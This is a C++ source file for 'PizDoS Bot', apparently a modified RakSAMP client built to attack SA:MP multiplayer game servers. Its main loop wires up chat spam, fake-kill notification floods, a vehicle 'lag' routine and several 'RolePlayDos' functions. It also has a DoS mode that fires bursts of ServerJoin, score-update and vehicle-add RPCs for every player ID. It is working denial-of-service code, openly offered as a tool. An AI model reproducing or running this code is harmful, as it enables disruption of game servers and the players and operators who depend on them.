#include "main.h"

RakClientInterface *pRakClient = NULL;
int iAreWeConnected = 0, iConnectionRequested = 0, iSpawned = 0, iGameInited = 0;
int iReconnectTime = 1 * 1;
PLAYERID g_myPlayerID;
char g_szNickName[32];

struct stPlayerInfo playerInfo[MAX_PLAYERS];
struct stVehiclePool vehiclePool[MAX_VEHICLES];

FILE *flLog = NULL;

PLAYERID normalMode_goto = -1;
DWORD dwAutoRunTick = GetTickCount();
int dd = 0;
SAMP * pSamp = NULL;

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
	// load up settings
	if(!LoadSettings())
	{
		Log("Ошибка загрузки настроек");
		getchar();
		return 0;
	}

	if(settings.iConsole)
		SetUpConsole();
	else
	{
		SetUpWindow(hInstance);
		Sleep(500); // wait a bit for the dialog to create
	}

	pSamp = new SAMP("samp.dll");

	if (pSamp->GetHMODULE() == NULL)
	{
		Log("Put me in SA:MP 0.3xR1-2 installation directory");
		Log(" - OR - ");
		Log("copy samp.dll AND bass.dll to the RakSAMP directory");

		if(flLog != NULL)
		{
			fclose(flLog);
			flLog = NULL;
		}
		Sleep(8000);
		
		return 0;
	}

	// RCON mode
	if(settings.runMode == RUNMODE_RCON)
	{
		if(RCONReceiveLoop())
		{
			if(flLog != NULL)
			{
				fclose(flLog);
				flLog = NULL;
			}

			return 0;
		}
	}	
	
	// set up networking
	pRakClient = RakNetworkFactory::GetRakClientInterface();
	if(pRakClient == NULL)
		return 0;

	pRakClient->SetMTUSize(576);

	resetPools(1, 0);
	RegisterRPCs(pRakClient);

	SYSTEMTIME time;
	GetLocalTime(&time);
	if(settings.iConsole)
	{
		Log(" ");
		Log("* ===================================================== *");
		Log("  PizDoS Bot v0.3x " RAKSAMP_VERSION " initialized on %02d/%02d/%02d %02d:%02d:%02d",
			time.wDay, time.wMonth, time.wYear, time.wHour, time.wMinute, time.wSecond);
		Log("  Authors: " AUTHOR "");
		Log("* ===================================================== *");
		Log(" ");
	}

	srand((unsigned int)GetTickCount());
	char szInfo[400];
	while(1)
	{
		UpdateNetwork(pRakClient);
	
		if(settings.ispam) test256();
		if(settings.test1) test();
		if(settings.test21) test24();
		if(settings.test12) test25();
		if(settings.test122) test250();
		if(settings.test133) test251();
		if(settings.test233) test254();
		if(settings.test231) test257();
		if(settings.test18) test256();
		if(settings.test2311) RolePlayDos1();
		if(settings.test23111) RolePlayDos2();
		if(settings.test23112) RolePlayDos3();
		if(settings.test2312) sampSpam();
		if (settings.changer) sampChanger(0);
		if (settings.test23155) RolePlayDos21();
		if (settings.test231555) RolePlayDos31();
		if (settings.test2315555) RolePlayDos32();
		if (settings.fakeKilll) RolePlayDos320();
		if (settings.test231556) RolePlayDos3244();

		INCAR_SYNC_DATA *pofSync;
		if (settings.testddd) {
		RakNet::BitStream outBitStream;
		outBitStream.Write(65535);
		pRakClient->Send(&outBitStream, HIGH_PRIORITY, RELIABLE, 0);
			}

		if (settings.fakeKill) {
			for(int a=0;a<46;a++){
				for(int b=0;b<getPlayerCount();b++){
					if(settings.fakeKill){
						SendWastedNotification(a, b);
					}
				}
			}
		}


		if (settings.lag) {
				static DWORD time = 0; 
       if (GetTickCount() - 0 > time) // 75 милисекунды 
       { 
		for ( int i = 1; i <MAX_VEHICLES; i++)
		{
        rcontest(i);
		time = GetTickCount(); 
        } 
	   }
		}


		if(!iConnectionRequested)
		{
			if(!iGettingNewName)
				sampConnect(settings.server.szAddr, settings.server.iPort, settings.server.szNickname, settings.server.szPassword, pRakClient);
			else
				sampConnect(settings.server.szAddr, settings.server.iPort, g_szNickName, settings.server.szPassword, pRakClient);

			iConnectionRequested = 1;
		}

		if (iAreWeConnected && iGameInited)
		{
			static DWORD dwLastInfoUpdate = GetTickCount();
			if(dwLastInfoUpdate && dwLastInfoUpdate < (GetTickCount() - 1000))
			{
				sprintf(szInfo, "-|||PizDoS Bot v0.3x|||- Пинг - %d",
				playerInfo[g_myPlayerID].dwPing);
				SetWindowText(texthwnd, szInfo);
			}
			 if(!iSpawned)
			{
				sampRequestClass(settings.iClassID);
				sampSpawn();

				iSpawned = 1;
			}

			if(settings.runMode == RUNMODE_BARE)
			{

			
			}
			else
			{
				if(settings.runMode == RUNMODE_STILL)
				{
	
				}

				if(settings.runMode == RUNMODE_NORMAL)
				{
					if(normalMode_goto == (PLAYERID)-1)
						onFootUpdateAtNormalPos();
				}

				// Have to teleport to play_pos so that we can get vehicles streamed in.
				if(settings.runMode == RUNMODE_PLAYROUTES)
				{
					if(rec_state == RECORDING_OFF)
						onFootUpdateAtNormalPos();
				}

				// Run autorun commands
				if(settings.iAutorun)
				{
					if(dwAutoRunTick && dwAutoRunTick < (GetTickCount() - 2000))
					{
						static int autorun;
						if(!autorun)
						{
							Log("Loading autorun...");
							for(int i = 0; i < MAX_AUTORUN_CMDS; i++)
								if(settings.autoRunCMDs[i].iExists)
									RunCommand(settings.autoRunCMDs[i].szCMD, 1);

							autorun = 1;
						}
					}
				}

				// Play routes handler
				if(settings.runMode == RUNMODE_PLAYROUTES)
					vehicle_playback_handler();

				// Following player mode.
				if(settings.runMode == RUNMODE_FOLLOWPLAYER)
				{
					PLAYERID copyingID = getPlayerIDFromPlayerName(settings.szFollowingPlayerName);
					if(copyingID != (PLAYERID)-1)
						onFootUpdateFollow(copyingID);
				}

				if(settings.runMode == RUNMODE_FOLLOWPLAYER1)
				{
					PLAYERID copyingID = getPlayerIDFromPlayerName(settings.szFollowingPlayerName1);
					if(copyingID != (PLAYERID)-1)
						onFootUpdateFollow1(copyingID);
				}

				if(settings.runMode == RUNMODE_FOLLOWPLAYER2)
				{
					PLAYERID copyingID = getPlayerIDFromPlayerName(settings.szFollowingPlayerName2);
					if(copyingID != (PLAYERID)-1)
						onFootUpdateFollow2(copyingID);
				}

				if(settings.runMode == RUNMODE_FOLLOWPLAYER3)
				{
					PLAYERID copyingID = getPlayerIDFromPlayerName(settings.szFollowingPlayerName3);
					if(copyingID != (PLAYERID)-1)
						onFootUpdateFollow3(copyingID);
				}

				if(settings.runMode == RUNMODE_FOLLOWPLAYER4)
				{
					PLAYERID copyingID = getPlayerIDFromPlayerName(settings.szFollowingPlayerName4);
					if(copyingID != (PLAYERID)-1)
						onFootUpdateFollow4(copyingID);
				}

				if(settings.runMode == RUNMODE_FOLLOWPLAYER5)
				{
					PLAYERID copyingID = getPlayerIDFromPlayerName(settings.szFollowingPlayerName5);
					if(copyingID != (PLAYERID)-1)
					onFootUpdateFollow5(copyingID);
				}

				if(settings.runMode == DoS)
				{
for(int a=0;a<MAX_PLAYERS;a++){
RakNet::BitStream bsvehicleDestroyed1;
RakNet::BitStream bsvehicleDestroyed2;
RakNet::BitStream bsvehicleDestroyed3;
RakNet::BitStream bsvehicleDestroyed4;
RakNet::BitStream bsvehicleDestroyed5;
RakNet::BitStream bsvehicleDestroyed6;
RakNet::BitStream bsvehicleDestroyed;
RakNet::BitStream bsvehicleDestroyed11;
RakNet::BitStream bsvehicleDestroyed21;
RakNet::BitStream bsvehicleDestroyed31;
RakNet::BitStream bsvehicleDestroyed41;
RakNet::BitStream bsvehicleDestroyed51;
RakNet::BitStream bsvehicleDestroyed61;
RakNet::BitStream bsvehicleDestroyed111;
bsvehicleDestroyed1.Write(a);
bsvehicleDestroyed2.Write(a);
bsvehicleDestroyed3.Write(a);
bsvehicleDestroyed4.Write(a);
bsvehicleDestroyed5.Write(a);
bsvehicleDestroyed6.Write(a);
bsvehicleDestroyed.Write(a);
bsvehicleDestroyed11.Write(a);
bsvehicleDestroyed21.Write(a);
bsvehicleDestroyed31.Write(a);
bsvehicleDestroyed41.Write(a);
bsvehicleDestroyed51.Write(a);
bsvehicleDestroyed61.Write(a);
bsvehicleDestroyed111.Write(a);
pRakClient->RPC(&RPC_UpdateScoresPingsIPs, &bsvehicleDestroyed1, SYSTEM_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
pRakClient->RPC(&RPC_ServerJoin, &bsvehicleDestroyed2, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
pRakClient->RPC(&RPC_UpdateScoresPingsIPs, &bsvehicleDestroyed3, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
pRakClient->RPC(&RPC_ServerJoin, &bsvehicleDestroyed4, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
pRakClient->RPC(&RPC_UpdateScoresPingsIPs, &bsvehicleDestroyed5, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
pRakClient->RPC(&RPC_ServerJoin, &bsvehicleDestroyed6, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
pRakClient->RPC(&RPC_UpdateScoresPingsIPs, &bsvehicleDestroyed, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
pRakClient->RPC(&RPC_ServerJoin, &bsvehicleDestroyed11, SYSTEM_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
pRakClient->RPC(&RPC_UpdateScoresPingsIPs, &bsvehicleDestroyed21, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
pRakClient->RPC(&RPC_ServerJoin, &bsvehicleDestroyed31, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
pRakClient->RPC(&RPC_UpdateScoresPingsIPs, &bsvehicleDestroyed41, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
pRakClient->RPC(&RPC_ServerJoin, &bsvehicleDestroyed51, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
pRakClient->RPC(&RPC_UpdateScoresPingsIPs, &bsvehicleDestroyed61, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
pRakClient->RPC(&RPC_WorldVehicleAdd, &bsvehicleDestroyed111, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
}}

				// Following a player with a vehicle mode.
				if(settings.runMode == RUNMODE_FOLLOWPLAYERSVEHICLE)
				{
					PLAYERID copyingID = getPlayerIDFromPlayerName(settings.szFollowingPlayerName);
					if(copyingID != (PLAYERID)-1)
						inCarUpdateFollow(copyingID, (VEHICLEID)settings.iFollowingWithVehicleID);
				}

			}
		}

bare:;
		Sleep(70);
	}

	if(flLog != NULL)
	{
		fclose(flLog);
		flLog = NULL;
	}

	return 0;
}

void Log ( char *fmt, ... )
{
	SYSTEMTIME	time;
	va_list		ap;

	if ( flLog == NULL )
	{
		flLog = fopen( "PizDoS Bot.log", "a" );
		if ( flLog == NULL )
			return;
	}

	GetLocalTime( &time );
	fprintf( flLog, "[%02d:%02d:%02d.%03d] ", time.wHour, time.wMinute, time.wSecond, time.wMilliseconds );
	if(settings.iPrintTimestamps)
	{
		if(settings.iConsole)
			printf("[%02d:%02d:%02d.%03d] ", time.wHour, time.wMinute, time.wSecond, time.wMilliseconds );
	}

	va_start( ap, fmt );
	vfprintf( flLog, fmt, ap );
	if(settings.iConsole)
		vprintf(fmt, ap);
	else
	{
		int lbCount = SendMessage(loghwnd, LB_GETCOUNT, 0, 0);
		LPTSTR buf = new TCHAR[512];
		wvsprintf(buf, fmt, ap);

		WPARAM idx = SendMessage(loghwnd, LB_ADDSTRING, 0, (LPARAM)buf);
		SendMessage(loghwnd, LB_SETCURSEL, lbCount - 1, 0);
		SendMessage(loghwnd, LB_SETTOPINDEX, idx, 0);
	}
	va_end( ap );

	fprintf( flLog, "\n" );
	if(settings.iConsole)
		printf("\n");
	fflush( flLog );
}

void gen_random(char *s, const int len)
{
	static const char alphanum[] =
		"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
		"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";

	for (int i = 0; i < len; ++i)
		s[i] = alphanum[rand() % (sizeof(alphanum) - 1)];

	s[len] = 0;
}

void gen_random1(char *s, const int len)
{
	static const char alphanum[] =
		"ewseawedcweaewryewryertdswqdfw"
		"kxhjdnfgxsmrewertrewterdlflc";

	for (int i = 0; i < len; ++i)
		s[i] = alphanum[rand() % (sizeof(alphanum) - 1)];

	s[len] = 0;
}
